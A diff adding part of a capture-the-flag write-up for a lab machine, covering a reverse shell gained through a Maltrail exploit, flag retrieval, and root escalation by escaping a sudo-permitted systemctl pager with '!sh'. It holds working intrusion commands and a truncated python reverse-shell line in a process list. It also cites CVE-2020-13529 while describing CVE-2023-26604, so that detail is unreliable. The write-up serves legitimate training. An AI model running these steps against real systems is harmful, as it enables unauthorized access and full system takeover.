@@ -129,3 +129,105 @@ nc -lvnp [listening_PORT]
 ```bash
 python3 exploit.py [listening_IP] [listening_PORT] [target_URL]
 ```
+<br/>
+
+We successfully created a **Reverse Shell**. To make our shell better we will execute the following command.
+
+```bash
+script /dev/null -c bash
+```
+<br/>
+
+If we run `id` we can see that we are user `puma`.
+
+```
+puma@sau:/opt/maltrail$ id 
+
+uid=1001(puma) gid=1001(puma) groups=1001(puma)
+```
+
+If we go to our User's `home/` directory, we will find the **User Flag**!
+
+```bash
+puma@sau:~$ cat /home/puma/user.txt
+
+[REDACTED_FLAG]
+```
+
+## Privilage Escalation
+
+Lets see what vulnerability we can find to Escalate our Privilages. If we run `sudo -l` we can see if and where we can use `sudo`.
+
+```bash
+puma@sau:~$ sudo -l
+
+Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+```
+<br/>
+
+Interesting! We see that we have permissions to execute `sudo systemctl status trail.service`. Let's also see what version `systemctl` is on.
+
+```bash
+systemctl --version
+
+systemd 245 (245.4-4ubuntu3.22)
++PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid
+```
+<br/>
+
+A quick search reveals that **Systemd Version 245** has a vulnerability, [**CVE-2020-13529**](https://nvd.nist.gov/vuln/detail/cve-2020-13529). Another look at [this](https://medium.com/@zenmoviefornotification/saidov-maxim-cve-2023-26604-c1232a526ba7) article will reveal to us exactly how to exploit this vulnerability.
+
+We run the `systemctl` command we have access to, and while on the pager just type `!sh`. Just like that we are now root! 
+
+```bash
+sudo systemctl status trail.service
+
+WARNING: terminal is not fully functional
+-  (press RETURN)
+● trail.service - Maltrail. Server of malicious traffic detection system
+     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
+     Active: active (running) since Thu 2025-07-31 15:52:59 UTC; 1h 40min ago
+       Docs: https://github.com/stamparm/maltrail#readme
+             https://github.com/stamparm/maltrail/wiki
+   Main PID: 877 (python3)
+      Tasks: 12 (limit: 4662)
+     Memory: 24.7M
+     CGroup: /system.slice/trail.service
+             ├─ 877 /usr/bin/python3 server.py
+             ├─1300 /bin/sh -c logger -p auth.info -t "maltrail[877]" "Failed p>
+             ├─1301 /bin/sh -c logger -p auth.info -t "maltrail[877]" "Failed p>
+             ├─1304 sh
+             ├─1305 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I>
+             ├─1306 /bin/sh
+             ├─1308 script /dev/null -c bash
+             ├─1309 bash
+             ├─1348 sudo systemctl status trail.service
+             ├─1349 systemctl status trail.service
+             └─1350 pager
+
+Jul 31 15:52:59 sau systemd[1]: Started Maltrail. Server of malicious traffic d>
+Jul 31 16:49:16 sau maltrail[1262]: Failed password for None from 127.0.0.1 por>
+lines 1-23!sh
+!sshh!sh
+```
+<br/>
+
+To make our shell better again, we will execute the following command. 
+
+```bash
+script /dev/null -c bash
+```
+<br/>
+
+If we go to `root/` directory, we will find the **Root Flag**!
+
+```bash
+puma@sau:~$ cat /root/root.txt
+
+[REDACTED_FLAG]
+```
